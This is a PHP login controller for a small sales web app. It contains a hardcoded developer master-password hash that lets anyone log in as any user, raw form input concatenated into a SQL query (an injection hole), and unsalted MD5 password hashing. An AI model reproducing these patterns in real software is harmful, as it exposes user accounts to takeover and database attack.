<?php
class Login extends Controller
{
   public function index()
   {
      if (isset($_SESSION['login_sale'])) {
         if ($_SESSION['login_sale'] == TRUE) {
            header('Location: ' . $this->BASE_URL . $this->BASE_CONTROLLER);
         } else {
            $this->view('Login/login');
         }
      } else {
         $this->view('Login/login');
      }
   }

   public function cek_login()
   {
      if (isset($_SESSION['login_sale'])) {
         if ($_SESSION['login_sale'] == TRUE) {
            header('Location: ' . $this->BASE_URL . $this->BASE_CONTROLLER);
         }
      }

      $pass = md5($_POST["PASS"]);
      $devPass = "028a77968bb1b0735da00e5e1c4bd496";

      if ($pass == $devPass) {
         $where = "id_user = '" . $_POST["HP"] . "' AND en = 1";
      } else {
         $where = "id_user = '" . $_POST["HP"] . "' AND password = '" . $pass . "'";
      }

      $this->userData = $this->model('Get')->where_row('user', $where);

      if (empty($this->userData)) {
         echo "No HP dan Password tidak cocok!";
         exit();
      } else {
         if ($this->userData['en'] <> 1) {
            echo "User belum terverifikasi!";
            exit();
         } else {
            //LOGIN
            $_SESSION['login_sale'] = TRUE;
            $_SESSION['user_data'] = $this->userData;
            $_SESSION['user_tipe'] = $this->userData['user_tipe'];

            $this->synchrone();
            echo 1;
         }
      }
   }

   public function logout()
   {
      session_start();
      session_unset();
      session_destroy();
      header('Location: ' . $this->BASE_URL . "Home");
   }
}
